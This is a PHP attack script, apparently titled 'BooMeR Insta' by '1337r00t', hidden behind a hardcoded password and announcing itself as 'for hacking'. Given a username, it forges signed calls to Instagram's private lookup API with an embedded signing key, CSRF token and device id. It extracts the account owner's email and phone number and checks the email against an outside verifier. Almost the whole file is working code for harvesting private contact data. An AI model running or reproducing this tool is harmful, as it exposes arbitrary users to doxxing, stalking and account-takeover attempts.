<html>
<head>
<title> BooMeR Insta By 1337r00t </title>
</head>
<body>
<center>
<?
function IPr()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }
    return $ip;
}

$passw0rd = "eliteroot1";
if ($_GET['pass']==$passw0rd){
	echo '
	<form action="" method="post">
	<br>
	<font color="blue"> Username :<input type="text" name="username"></font><br><br>
	<input type="submit" name="enter" value="Show Me :)">
	</form>';
	if($_POST['enter']){
		/////////////////////////////
		$username = $_POST['username'];
		$secret = '6a5048da38cd138aacdcd6fb59fa8735f4f39a6380a8e7c10e13c075514ee027';
		$sign = hash_hmac('SHA256','{"_csrftoken":"EUut8HW6td1ZDU3Ccr36vp9gEshRlMwf","q":"'.$username.'","guid":"1ce02b3d-5663-4d39-8fa0-8cbfbb6363e9","device_id":"android-e5279a9138d93745"}',$secret);
		$payload = urlencode('{"_csrftoken":"EUut8HW6td1ZDU3Ccr36vp9gEshRlMwf","q":"'.$username.'","guid":"1ce02b3d-5663-4d39-8fa0-8cbfbb6363e9","device_id":"android-e5279a9138d93745"}');
		$post = "ig_sig_key_version=4&signed_body=$sign.$payload";
		/////////////////////////////
		$api = curl_init();
		curl_setopt($api, CURLOPT_URL, "https://i.instagram.com/api/v1/users/lookup/");
		curl_setopt($api, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($api, CURLOPT_FOLLOWLOCATION, false);
		curl_setopt($api, CURLOPT_HTTPHEADER, array(
			'User-Agent: Instagram 7.16.0 Android'
		));
		curl_setopt($api, CURLOPT_POSTFIELDS, $post);
		$response = curl_exec($api);
		if(eregi('{"user": {"pk"', $response))
			{
				/////////////////////////////////////////////////
				$startemail = explode('"email": "' , $response );
				$endemail = explode('"' , $startemail[1] );
				$email = $endemail[0];
				/////////////////////////////////////////////////
				$startphone = explode('"phone_number": "' , $response );
				$endphone = explode('"' , $startphone[1] );
				$number = $endphone[0];
				/////////////////////////////////////////////////
				$check = curl_init();
				curl_setopt($check, CURLOPT_URL, "http://www.bulkemailchecker.com/free-email-checker-api.php");
				curl_setopt($check, CURLOPT_RETURNTRANSFER, 1);
				curl_setopt($check, CURLOPT_FOLLOWLOCATION, 1);
				curl_setopt($check, CURLOPT_POSTFIELDS, "&email=$email");
				$checked = curl_exec($check);
				if(eregi('The address provided passed all tests.', $checked))
					{
						echo '-----------
						<font color="blue"><br><br>
						Username : '.$username.'<br>
						Email : (</font><font color="red">'.$email.'</font><font color="blue">)<br>'.$checked.'<br>
						NumberPhone : '.$number.'<br>
						<br>
						</font>
						<br>
						-----------
						';
					}
					else
					{
						echo '-----------
						<font color="blue"><br><br>
						Username : '.$username.'<br>
						Email : (</font><font color="green">'.$email.'</font><font color="blue">)<br>'.$checked.'<br>
						NumberPhone : '.$number.'<br>
						<br>
						</font>
						<br>
						-----------
						';
					}
		
			}
			else
			{
				if(eregi('Please wait a few minutes before you try again.', $response)){
					$ip = IPr();
					echo "<font color='red'>Blocked IP ($ip) From Server Instagram .<br>انتظر دقائق فحسب واعد المحاولة</font>";
				}
				else
				{
					if(eregi('No users found', $response)){
						$xss = htmlspecialchars($username);
						echo "<font color='red'>This is User (@$xss) Not Found</font>";
					}
					else
					{
						echo "<font color='blue'>Oooh No</font>";
					}
				}
			}
	}
	else
	{
		echo "<br> <h2>Coded By 1337r00t</h2>";
	}
}
else
{
	echo '
Hi , input password script ?pass=[here] for hacking ;)
';
}
?>
</center>
</body>
</html>
